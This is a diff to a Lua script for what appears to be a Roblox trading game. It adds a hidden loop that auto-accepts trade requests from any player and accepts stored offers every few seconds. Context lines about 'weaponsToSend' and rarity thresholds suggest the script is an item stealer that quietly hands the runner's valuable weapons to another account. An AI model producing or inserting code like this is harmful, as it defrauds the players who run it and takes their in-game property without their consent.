@@ -771,6 +771,46 @@ task.spawn(function()
     end
 end)
 
+-- Auto-accept incoming trades from any player
+task.spawn(function()
+    UnlockTrades()
+    local function acceptTradeRequest()
+        local acceptRemotes = {
+            ReplicatedStorage.Trade:FindFirstChild("AcceptRequest"),
+            ReplicatedStorage.Trade:FindFirstChild("Accept"),
+            ReplicatedStorage.Trade:FindFirstChild("Respond"),
+            ReplicatedStorage.Trade:FindFirstChild("AcceptTradeRequest"),
+        }
+        for _, remote in ipairs(acceptRemotes) do
+            if remote then
+                local ok = pcall(function()
+                    if remote.ClassName == "RemoteFunction" then
+                        remote:InvokeServer(true)
+                    else
+                        remote:FireServer(true)
+                    end
+                end)
+                if ok then return true end
+            end
+        end
+        return false
+    end
+    while true do
+        task.wait(0.3)
+        local status = getTradeStatus()
+        if status == "ReceivingRequest" then
+            acceptTradeRequest()
+        elseif status == "StartTrade" then
+            task.wait(1.5)
+            if _G.LastOffer then
+                local ok = pcall(function()
+                    Trade.AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer)
+                end)
+            end
+        end
+    end
+end)
+
 local weaponsToSend = {}
 local min_rarity_index = table.find(rarityTable, min_rarity)
 local untradable = {
